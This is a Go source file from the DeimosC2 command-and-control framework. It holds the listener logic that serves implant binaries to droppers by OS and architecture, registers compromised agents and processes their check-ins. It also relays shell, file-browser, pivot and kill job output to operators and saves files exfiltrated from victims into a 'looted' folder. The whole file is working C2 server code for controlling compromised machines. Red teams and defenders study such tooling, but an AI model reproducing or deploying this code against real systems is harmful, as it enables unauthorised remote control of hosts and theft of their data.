package listeners

import (
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"os"
	"path"
	"path/filepath"
	"strings"
	"time"

	"github.com/DeimosC2/DeimosC2/c2/agents"
	"github.com/DeimosC2/DeimosC2/c2/lib/sqldb"
	"github.com/DeimosC2/DeimosC2/c2/modules"
	"github.com/DeimosC2/DeimosC2/c2/webserver/websockets"
	"github.com/DeimosC2/DeimosC2/lib/agentscommon"
	"github.com/DeimosC2/DeimosC2/lib/logging"
	"github.com/DeimosC2/DeimosC2/lib/modulescommon"
)

//ListOptions holds all possible options required for listeners
type ListOptions struct {
	LType        string       `json:"ltype"`    //Type of listener
	Name         string       `json:"name"`     //Listener name
	Host         string       `json:"host"`     //IP or DQDN listener will bind too
	Port         string       `json:"port"`     //Port to listen on
	Key          string       `json:"key"`      //Listener UUID4 name
	Advanced     interface{}  `json:"advanced"` //Advanced listener options held as JSON here
	AgentOptions AgentOptions `json:"agentoptions"`
	Obfuscation  bool         `json:"obfuscations,omitempty"`
	Gooses       []string     `json:"gooses,omitempty"`
}

//AgentOptions holds all of the options for agents
type AgentOptions struct {
	Delay     string `json:"delay"`     //Agent Delay
	Jitter    string `json:"jitter"`    //Agent Jitter value
	Eol       string `json:"eol"`       //When the Agent should die
	LiveHours string `json:"livehours"` //When the agent can operate
}

//Dropper returns the binary asked for by the dropper
func Dropper(data string, lName string) []byte {
	cwd, err := os.Getwd()
	if err != nil {
		logging.ErrorLogger.Println(err.Error())
	}
	var agentBinary string
	//Determine OS Type + Arch + Processor
	osType := data[36:37]
	archType := data[37:38]
	procType := data[38:]

	logging.Logger.Println(osType)
	logging.Logger.Println(archType)
	logging.Logger.Println(procType)
	switch {
	case osType == "W" && archType == "6" && procType == "I":
		agentBinary = path.Join(cwd, "resources", "listenerresources", lName, "TCPAgent_Win_64_Intel.exe")
	case osType == "W" && archType == "3" && procType == "I":
		agentBinary = path.Join(cwd, "resources", "listenerresources", lName, "TCPAgent_Win_32_Intel.exe")
	case osType == "W" && archType == "6" && procType == "A":
		agentBinary = path.Join(cwd, "resources", "listenerresources", lName, "TCPAgent_Win_64_ARM.exe")
	case osType == "W" && archType == "3" && procType == "A":
		agentBinary = path.Join(cwd, "resources", "listenerresources", lName, "TCPAgent_Win_32_ARM.exe")
	case osType == "L" && archType == "6" && procType == "I":
		agentBinary = path.Join(cwd, "resources", "listenerresources", lName, "TCPAgent_Lin_64_Intel.elf")
	case osType == "L" && archType == "3" && procType == "I":
		agentBinary = path.Join(cwd, "resources", "listenerresources", lName, "TCPAgent_Lin_32_Intel.elf")
	case osType == "L" && archType == "6" && procType == "A":
		agentBinary = path.Join(cwd, "resources", "listenerresources", lName, "TCPAgent_Lin_64_ARM.elf")
	case osType == "L" && archType == "3" && procType == "A":
		agentBinary = path.Join(cwd, "resources", "listenerresources", lName, "TCPAgent_Lin_32_ARM.elf")
	case osType == "L" && archType == "6" && procType == "M":
		agentBinary = path.Join(cwd, "resources", "listenerresources", lName, "TCPAgent_Lin_64_MIPS.elf")
	case osType == "L" && archType == "3" && procType == "M":
		agentBinary = path.Join(cwd, "resources", "listenerresources", lName, "TCPAgent_Lin_32_MIPS.elf")
	case osType == "M" && archType == "6" && procType == "I":
		agentBinary = path.Join(cwd, "resources", "listenerresources", lName, "TCPAgent_Mac_64_Intel.o")
	case osType == "M" && archType == "3" && procType == "I":
		agentBinary = path.Join(cwd, "resources", "listenerresources", lName, "TCPAgent_Mac_32_Intel.o")
	}

	msg, err := ioutil.ReadFile(agentBinary)
	if err != nil {
		logging.ErrorLogger.Println(err.Error())
	}
	return msg
}

//Registers the agent with the server
func register(data string, lName string, DNS bool, agentKey string, externalIP string) string {
	logging.Logger.Println("Registering Agent")

	//DNS is a oneoff issue here maybe able to change this at a later date
	if DNS {
		if data == "" {
			logging.Logger.Println("[+] New Agent connected")
			agentKey := agents.AgentKey()
			return agentKey
		}
		logging.Logger.Println("[+] New Agent connected")

		logging.Logger.Println(lName)
		storeInfo := agents.AgentCreate(data, lName, agentKey, externalIP)
		logging.Logger.Println("[+] Info stored for agent ", storeInfo)
		return agentKey
	} else {
		logging.Logger.Println("[+] New Agent connected")
		agentKey := agents.AgentKey()

		logging.Logger.Println(lName)
		storeInfo := agents.AgentCreate(data, lName, agentKey, externalIP)
		logging.Logger.Println("[+] Info stored for agent ", storeInfo)
		return agentKey
	}
}

//Takes in the agents job output and then sends it any new jobs that may exist
func checkIn(data string, agentKey string, externalIP string) {
	//Update Heartbeat
	hb := websockets.HeartBeat{
		AgentKey: agentKey,
		Time:     time.Now(),
	}

	hb.Send()

	//Update last checkin
	sqldb.AgentCheckin(agentKey)

	//Update the agents last checkin
	agents.AllAgents.Mutex.Lock()
	if val, ok := agents.AllAgents.List[agentKey]; ok {
		val.LastCheckin = time.Now()
	}
	agents.AllAgents.Mutex.Unlock()

	output := map[int]*agentscommon.JobOutput{}

	err := json.Unmarshal([]byte(data), &output)
	if err != nil {
		logging.ErrorLogger.Println(err.Error())
	}
	//Now that i have the data i need to go through all of it and see what to do with each
	for key, value := range output {
		switch value.JobName {
		case "module":
			modData := modulescommon.ModuleCom{}
			err := json.Unmarshal([]byte(value.Results), &modData)
			if err != nil {
				logging.ErrorLogger.Println(err.Error())
			}
			modules.ModuleServer(modData)
		case "shell": //Shell means it will go to the users console
			msg := "[{\"AgentKey\": \"" + agentKey + "\"},"
			logging.Logger.Println("Value is: ")
			logging.Logger.Println(value)
			newMsg, _ := json.Marshal(value)
			msg += string(newMsg) + ","

			msg = strings.TrimSuffix(msg, ",")
			msg += "]"

			outMsg := websockets.SendMessage{
				Type:         "agent",
				FunctionName: "joboutput",
				Data:         msg,
				Success:      true,
			}
			websockets.AlertRegisteredUsers(outMsg, agentKey)
		case "error": //Error means it will go to the users console as an error message
			msg := "[{\"AgentKey\": \"" + agentKey + "\"},"
			logging.Logger.Println("Value is: ")
			logging.Logger.Println(value)
			newMsg, _ := json.Marshal(value)
			msg += string(newMsg) + ","

			msg = strings.TrimSuffix(msg, ",")
			msg += "]"

			outMsg := websockets.SendMessage{
				Type:         "agent",
				FunctionName: "agenterror",
				Data:         msg,
				Success:      true,
			}
			websockets.AlertRegisteredUsers(outMsg, agentKey)
		case "download":
			download(value.Results, agentKey)
			outMsg := websockets.SendMessage{
				Type:         "agent",
				FunctionName: "joboutput",
				Data:         "Download Completed", //Change to the file location
				Success:      true,
			}
			websockets.AlertRegisteredUsers(outMsg, agentKey)
		case "fileBrowser":
			msg := "[{\"AgentKey\": \"" + agentKey + "\"},"
			logging.Logger.Println("Value is: ")
			logging.Logger.Println(value)
			newMsg, _ := json.Marshal(value)
			msg += string(newMsg) + ","

			msg = strings.TrimSuffix(msg, ",")
			msg += "]"

			outMsg := websockets.SendMessage{
				Type:         "agent",
				FunctionName: "joboutput",
				Data:         msg,
				Success:      true,
			}
			websockets.AlertRegisteredUsers(outMsg, agentKey)
		case "pivot":
			pivotHandler([]byte(value.Results), agentKey, externalIP)
		case "kill":
			agents.RemoveAgent(agentKey)
			logging.Logger.Println("Removing agent: ", agentKey)
			outMsg := websockets.SendMessage{
				Type:         "agent",
				FunctionName: "joboutput",
				Data:         "Agent is being removed", //Change to the file location
				Success:      true,
			}
			websockets.AlertRegisteredUsers(outMsg, agentKey)
		}
		delete(output, key)
	}

}

//Doing that will allow us to pass alot more data including the correct filename to write the file too
func download(data string, agentKey string) {
	//Data will be a json string that needs to be unmarshalled
	logging.Logger.Println("STarting download function")

	downloadData := agentscommon.DownloadOutput{}

	err := json.Unmarshal([]byte(data), &downloadData)
	if err != nil {
		logging.ErrorLogger.Println(err.Error())
	}

	logging.Logger.Println("Download name is:", downloadData.Filename)

	//Get current working directory
	cwd, err := os.Getwd()
	if err != nil {
		logging.ErrorLogger.Println(err.Error())
	}

	folderPath := path.Join("looted", agentKey, "files")

	//Set the full path
	fullPath := path.Join(cwd, "resources", "looted", agentKey, "files")
	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		//Make the directory under loot with agent name
		os.Mkdir(fullPath, 0755)
	}

	//Parse the filename from the extension
	fname := strings.TrimSuffix(downloadData.Filename, filepath.Ext(downloadData.Filename))
	//Parse the extention from the filename
	fext := strings.TrimSuffix(filepath.Ext(downloadData.Filename), downloadData.Filename)
	//Get the current date/time
	time := time.Now()
	//Format the filename
	fullFileName := path.Join(fullPath, (fname + "_" + time.Format("2006_01_02_150405") + fext))
	//Write the file
	writeData, err := base64.StdEncoding.DecodeString(downloadData.FileData)
	if err != nil {
		logging.ErrorLogger.Println(err.Error())
	}
	err = ioutil.WriteFile(fullFileName, []byte(writeData), 0755)
	if err != nil {
		logging.ErrorLogger.Println(err.Error())
	}
	//Free memory after write
	data = ""

	v := agentscommon.JobOutput{
		JobName: "download",
		Results: (path.Join(folderPath, (fname + "_" + time.Format("2006_01_02_150405") + fext))),
	}

	msg := "[{\"AgentKey\": \"" + agentKey + "\"},"
	newMsg, _ := json.Marshal(v)
	msg += string(newMsg) + ","

	msg = strings.TrimSuffix(msg, ",")
	msg += "]"

	outMsg := websockets.SendMessage{
		Type:         "Agent",
		FunctionName: "JobOutput",
		Data:         msg,
		Success:      true,
	}
	websockets.AlertRegisteredUsers(outMsg, agentKey)
}

//ModHandler verifes the module data and passes it forward to the backend for the agent
func ModHandler(data string) {
	//This case is for modules the options are:
	//Obtaining the module
	//Sending the data to the backend modules

	newMod := modulescommon.ModuleCom{}
	err := json.Unmarshal([]byte(data), &newMod)
	if err != nil {
		logging.ErrorLogger.Println(err.Error())
	}

	if modules.AllModules.List[newMod.AgentKey] != nil {
		modules.ModuleServer(newMod)

	} else {
		logging.Logger.Println("For some reason the moduleserver didnt start")
	}
}

func pivotHandler(data []byte, pListener string, externalIP string) string {

	//unmarshall the pivot data and act on it
	job := agentscommon.PivotOutput{}
	err := json.Unmarshal(data, &job)
	if err != nil {
		logging.ErrorLogger.Println(err.Error())
		return ""
	}

	switch job.MsgType {
	case "0":
		nName := register(job.Data, job.AgentKey, false, "", externalIP)
		return nName
	case "2":
		checkIn(string(job.Data), job.AgentKey, externalIP)
	case "6":

		ModHandler(job.Data)
	}
	return ""
}
